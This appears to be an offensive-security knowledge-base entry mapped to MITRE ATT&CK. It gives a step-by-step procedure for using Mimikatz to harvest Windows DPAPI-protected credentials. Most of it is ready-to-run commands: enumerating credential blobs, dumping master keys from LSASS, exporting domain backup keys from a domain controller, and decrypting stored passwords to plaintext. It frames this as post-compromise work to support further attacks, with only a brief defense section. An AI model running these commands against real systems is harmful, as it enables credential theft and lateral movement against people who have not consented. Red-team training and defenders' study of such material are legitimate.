---
type: procedure
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
techniques:
  - >-
    [[techniques/Credentials from Password Stores|T1555 - Credentials from
    Password Stores]]
sub_techniques:
  - >-
    [[sub-techniques/Credentials from Web Browsers|T1555.003 - Credentials from
    Web Browsers]]
  - '[[sub-techniques/Securityd Memory|T1555.002 - Securityd Memory]]'
tags:
  - '[[tags/Data Protection API]]'
  - '[[tags/Mimikatz - Credential Manager & DPAPI]]'
  - '[[tags/Windows - DPAPI]]'
commands:
  - '[[commands/dir-list-user-credentials-folder]]'
  - '[[commands/mimikatz-dpapi-cred-decrypt-file]]'
  - '[[commands/mimikatz-sekurlsa-dpapi-find-masterkey]]'
  - '[[commands/mimikatz-dpapi-cred-decrypt-with-masterkey]]'
  - '[[commands/mimikatz-lsadump-backupkeys-export]]'
  - '[[commands/mimikatz-dpapi-masterkey-decrypt-with-pvk]]'
tools:
  - '[[tools/Mimikatz]]'
platforms:
  - Windows
skill_level: intermediate
impact_level: high
detection_risk: high
verified: true
validated: true
---

# Windows-DPAPI-Credential-Retrieval-with-Mimikatz

## Summary

This procedure uses Mimikatz to locate and decrypt credentials protected by the Windows Data Protection API (DPAPI), which encrypts sensitive data like passwords using keys derived from user credentials. It targets stored credentials in user profiles, such as those from web browsers or applications, allowing attackers with local access to extract plaintext secrets for lateral movement or privilege escalation.

## Description

DPAPI is a built-in Windows mechanism for protecting sensitive data by encrypting it with a master key tied to the user's login credentials. Credentials from password stores, including web browsers, are often encrypted this way. Mimikatz exploits this by extracting DPAPI blobs from memory or files and decrypting them using recovered master keys or backup keys from domain controllers. This procedure assumes local administrator access on a Windows target and is commonly used post-compromise to harvest credentials for further attacks. It works on Windows 7 and later, targeting user-specific credential stores in AppData.

## Requirements

1. Local administrator privileges on the target Windows system to run Mimikatz and access protected files.
2. Mimikatz tool installed or available (e.g., via in-memory execution to evade detection).
3. Knowledge of the target user's SID and profile path for locating DPAPI blobs.
4. For domain environments, access to a domain controller for backup key extraction.

## Defense

- Protect DPAPI keys by enforcing strong user passwords and enabling multi-factor authentication (MFA) to hinder key derivation.
- Monitor for Mimikatz execution via process monitoring (e.g., Sysmon rules for suspicious DLL loads or command-line arguments containing 'dpapi' or 'sekurlsa').
- Use Windows Defender Credential Guard to isolate and protect LSASS and DPAPI secrets from extraction tools.
- Regularly audit credential stores and implement application whitelisting to block unauthorized tools like Mimikatz.

## Objectives

1. Locate DPAPI-protected credential files in the user's profile.
2. Extract and decrypt credentials using Mimikatz modules for DPAPI and LSADump.
3. Recover master or backup keys to access encrypted blobs.
4. Obtain plaintext credentials for use in further attacks.

## Instructions

### Step 1: List Credentials Folder

**Context**: Begin by enumerating the credentials directory to identify DPAPI-protected files, which are stored as GUID-named blobs containing encrypted secrets.

**Command** ([[commands/dir-list-user-credentials-folder]]):
```cmd
dir C:\Users\$_USERNAME\AppData\Local\Microsoft\Credentials\*
```

> This command lists all credential files in the user's local store. Replace $_USERNAME with the target username (e.g., 'Administrator'). It reveals file names like '2647629F5AA74CD934ECD2F88D64ECD0', which are DPAPI blobs to target.

### Step 2: Attempt Basic Decryption with Mimikatz

**Context**: Use Mimikatz to attempt decryption of a specific credential file using the current session's context, which may succeed if the tool runs under the user's session.

**Command** ([[commands/mimikatz-dpapi-cred-decrypt-file]]):
```cmd
mimikatz.exe "dpapi::cred /in:C:\Users\$_USERNAME\AppData\Local\Microsoft\Credentials\$_CREDENTIAL_GUID"
```

> Run Mimikatz and invoke the dpapi::cred module on a specific file. If the session key is available, it decrypts inline. This step verifies if credentials can be accessed without additional keys.

### Step 3: Find Master Key from Memory

**Context**: Extract the DPAPI master key from LSASS memory using Sekurlsa, as this key is derived from the user's login and protects credential blobs.

**Command** ([[commands/mimikatz-sekurlsa-dpapi-find-masterkey]]):
```cmd
mimikatz.exe "sekurlsa::dpapi"
```

> This Mimikatz command dumps DPAPI information from the Security Account Manager (SAM) and LSASS, revealing the master key hash or GUID needed for further decryption.

### Step 4: Decrypt Credentials with Master Key

**Context**: If the master key is obtained, use it to decrypt the credential blob offline, revealing plaintext data like URLs, usernames, and passwords.

**Command** ([[commands/mimikatz-dpapi-cred-decrypt-with-masterkey]]):
```cmd
mimikatz.exe "dpapi::cred /in:C:\Users\$_USERNAME\AppData\Local\Microsoft\Credentials\$_CREDENTIAL_GUID /masterkey:$_MASTERKEY"
```

> Provide the extracted master key to the dpapi::cred module. This step performs the actual decryption; success yields readable credential details.

### Step 5: Export Backup Keys from Domain Controller

**Context**: In domain environments, export DPAPI backup keys from the DC using LSADump, which allows decryption of user master keys without the original password.

**Command** ([[commands/mimikatz-lsadump-backupkeys-export]]):
```cmd
mimikatz.exe "lsadump::backupkeys /system:$_SYSTEM_NAME /export"
```

> Target a domain controller (e.g., 'dc01.lab.local') with admin access. This exports private keys (PVK files) for offline use in decrypting domain-backed DPAPI blobs.

### Step 6: Decrypt Master Key with Backup PVK

**Context**: Use the exported backup private key to decrypt a user's master key file, enabling access to all associated credentials.

**Command** ([[commands/mimikatz-dpapi-masterkey-decrypt-with-pvk]]):
```cmd
mimikatz.exe "dpapi::masterkey /in:\"C:\Users\$_USERNAME\AppData\Roaming\Microsoft\Protect\$_USER_SID\$_MASTERKEY_GUID\" /pvk:$_PVK_FILE"
```

> Point to the user's master key path (using SID and GUID) and the PVK file from Step 5. This recovers the master key for broader decryption.
